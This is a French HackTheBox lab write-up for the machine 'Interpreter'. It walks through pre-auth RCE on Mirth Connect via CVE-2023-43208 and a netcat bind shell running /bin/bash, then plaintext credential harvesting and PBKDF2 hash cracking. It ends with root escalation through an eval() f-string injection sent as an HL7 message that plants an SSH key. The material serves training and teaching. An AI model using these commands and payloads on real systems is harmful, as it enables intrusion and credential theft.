---
title: "HackTheBox - Interpreter"
date: 2026-02-25 00:00:00 +0200
categories: [HackTheBox, Challenge, Medium]
tags: [mirth-connect, cve-2023-43208, deserialization, pbkdf2, bind-shell, fstring-injection, eval, hl7, privilege-escalation]
description: "Write-up de la machine Interpreter - Exploitation de Mirth Connect via désérialisation Java (CVE-2023-43208), crack de hash PBKDF2-HMAC-SHA256, et escalade de privilèges via injection dans un eval() Python"
image:
  path: /assets/img/posts/Interpreter/interpreter.png
  alt: "HackTheBox - Interpreter"
---

## Informations sur la machine

| Propriété      | Valeur       |
| -------------- | ------------ |
| **OS**         | Linux        |
| **Difficulté** | Medium       |
| **Points**     | 30           |
| **IP**         | 10.129.6.199 |

---

## Reconnaissance

### Scan TCP

```bash
nmap -sC -sV 10.129.6.199
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
```

Deux ports web exposent la même interface — une redirection automatique vers `/webadmin/Index.action` identifie immédiatement l'application.

### Identification de la version

L'API Swagger accessible sans authentification sur `/api/openapi.json` confirme la version exacte :

```
NextGen Connect Client API — 4.4.0
```

> Mirth Connect 4.4.0 est la dernière version vulnérable à CVE-2023-43208, corrigée en 4.4.1.
{: .prompt-warning }

---

## Exploitation initiale — CVE-2023-43208

### Description de la vulnérabilité

CVE-2023-43208 est un **RCE pré-authentifié** affectant NextGen Mirth Connect ≤ 4.4.0. La vulnérabilité exploite une désérialisation Java non sécurisée sur l'endpoint `/api/users`. En envoyant un payload XML contenant une **gadget chain** (CommonsBeanutils), le serveur désérialise les données sans validation et exécute des commandes arbitraires. Aucune authentification n'est requise.

Il s'agit d'un bypass du patch de CVE-2023-37679 — la correction initiale implémentait une denylist qui a été contournée par les chercheurs de Horizon3.ai.

### Détection

```bash
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
python3 detection.py https://10.129.6.199
```

```
Server version: 4.4.0
Vulnerable to CVE-2023-43208.
```

### Obtention d'un shell

Le reverse shell étant bloqué (pas de connectivité sortante vers l'attaquant), utilisation d'un **bind shell** — la cible ouvre un port et on s'y connecte :

```bash
# Ouvre un bind shell sur la cible
python3 CVE-2023-43208.py -u https://10.129.6.199 -c 'nc -lvnp 5555 -e /bin/bash'

# Connexion depuis l'attaquant
nc 10.129.6.199 5555
```

```bash
mirth@interpreter:/usr/local/mirthconnect$ id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

> Shell obtenu en tant que `mirth` — un utilisateur de service sans home directory.
{: .prompt-tip }

---

## Mouvement latéral — mirth → sedric

### Credentials en clair dans mirth.properties

Le fichier de configuration principal de Mirth Connect stocke les credentials de base de données **en clair** :

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```
database.url       = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username  = mirthdb
database.password  = MirthPass123!
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass   = tAuJfQeXdnPw
```

### Extraction du hash depuis la base

```bash
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
```

```
| ID | USERNAME |
|  2 | sedric   |
```

```sql
SELECT * FROM PERSON_PASSWORD;
```

```
| PERSON_ID | PASSWORD                                                 |
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
```

### Analyse du format de hash

Mirth Connect 4.4.0 a migré son algorithme de hachage de SHA-256 vers **PBKDF2WithHmacSHA256 avec 600 000 itérations**. Le hash encodé en base64 contient **8 octets de salt** suivis de **32 octets de hash**.

```bash
python3 -c "
import base64
raw = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
print(f'Longueur totale : {len(raw)} bytes')
salt = base64.b64encode(raw[:8]).decode()
h = base64.b64encode(raw[8:]).decode()
print(f'Format hashcat  : sha256:600000:{salt}:{h}')
"
```

```
Longueur totale : 40 bytes
Format hashcat  : sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### Crack du hash

```bash
echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

Time.Started : 01:07:07
Time.Cracked : 01:09:35 (~2 minutes 28 secondes)
```

> Le mot de passe de **sedric** est **`snowflake1`**.
{: .prompt-tip }

### Connexion SSH

```bash
ssh sedric@10.129.6.199
# Password: snowflake1
cat ~/user.txt
```

---

## Escalade de privilèges — injection eval() dans notif.py

### Découverte du service vulnérable

```bash
ps aux | grep python
```

```
root  3568  /usr/bin/python3 /usr/local/bin/notif.py
```

```bash
ss -tlnp
```

```
LISTEN  127.0.0.1:54321   # service notif.py
LISTEN  0.0.0.0:6661      # channel Mirth Connect (MLLP/HL7)
```

Un service Flask tourne en **root** sur `127.0.0.1:54321`. Il est le destinataire du channel Mirth Connect `INTERPRETER - HL7 TO XML TO NOTIFY`, qui reçoit des messages HL7 sur le port 6661 et les transfère en XML vers `/addPatient`.

### Analyse de la vulnérabilité

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
    return eval(f"f'''{template}'''")   # ← INJECTION ICI
```

Les variables sont insérées dans le f-string **avant** l'appel à `eval()`. Si `first` contient `{__import__('os').popen('cmd').read()}`, cette expression sera évaluée lors de l'exécution. Le regex autorise les accolades `{}` ainsi que les caractères nécessaires à `__import__` et `os.popen` — l'injection passe la validation.

> Le problème est l'ordre des opérations : le regex valide les caractères un par un, mais ne peut pas détecter que leur combinaison forme du code Python exécutable.
{: .prompt-info }

Les espaces étant interdits par le regex, les commandes sont encodées caractère par caractère via `chr()` pour contourner la validation.

### Exploitation

**Génération de la clé SSH :**

```bash
ssh-keygen -t ed25519 -f /tmp/htb_key -N ""
```

**Envoi du message HL7 malicieux depuis sedric :**

Le channel Mirth Connect utilise le protocole **MLLP** (Minimal Lower Layer Protocol) — les messages sont encadrés par `\x0b` (start) et `\x1c\x0d` (end). Le payload est injecté dans le champ `FIRSTNAME` du segment `PID` du message HL7.

```bash
python3 << 'EOF'
import socket

cmd = "mkdir /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPYODksLWlOxbD42FDM912O76umjRVhHtvPW9usV6Ruf' >> /root/.ssh/authorized_keys"
encoded = '+'.join([f'chr({ord(c)})' for c in cmd])
firstname = '{__import__(chr(111)+chr(115)).popen(' + encoded + ').read()}'

hl7  = 'MSH|^~\\&|WEBAP|INTERPRETER|MIRTH|INTERPRETER|20240101||ADT^A01|1|P|2.5\r'
hl7 += 'PID|1||PAT001^^^INTERPRETER||LAST^' + firstname + '||19900101|M'

payload = b'\x0b' + hl7.encode() + b'\x1c\x0d'
s = socket.socket()
s.connect(('127.0.0.1', 6661))
s.send(payload)
print(s.recv(1024))
EOF
```

```
b'\x0bMSH|^~\\&|MIRTH|INTERPRETER|...|MSA|AA|1\r\x1c\r'
```

Le `MSA|AA` confirme que le message a été accepté et traité par Mirth Connect, déclenchant l'appel vers notif.py avec notre payload.

**Connexion root :**

```bash
ssh -i /tmp/htb_key root@localhost
```

```bash
root@interpreter:~# id
uid=0(root) gid=0(root) groups=0(root)
root@interpreter:~# cat /root/root.txt
```

---

## Leçons apprises

- **Mirth Connect ≤ 4.4.0** est vulnérable à un RCE pré-authentifié (CVE-2023-43208) via désérialisation Java — aucun credentials nécessaires pour compromettre le serveur
- **Les fichiers de configuration d'applications** comme `mirth.properties` stockent souvent des credentials en clair et constituent une cible prioritaire après l'obtention d'un shell initial
- **PBKDF2 avec 600 000 itérations** ralentit considérablement le cracking (~69 H/s sur CPU) mais reste vulnérable aux mots de passe faibles présents dans rockyou.txt
- **L'utilisation d'`eval()` sur des données utilisateur** est une vulnérabilité critique même avec un regex de validation — le regex valide les caractères individuellement mais ne peut pas détecter les constructions de code valides formées par leur combinaison
- **Un bind shell** est une alternative efficace au reverse shell lorsque le pare-feu bloque les connexions sortantes depuis la cible

**Machine complétée**

{% include comments.html %}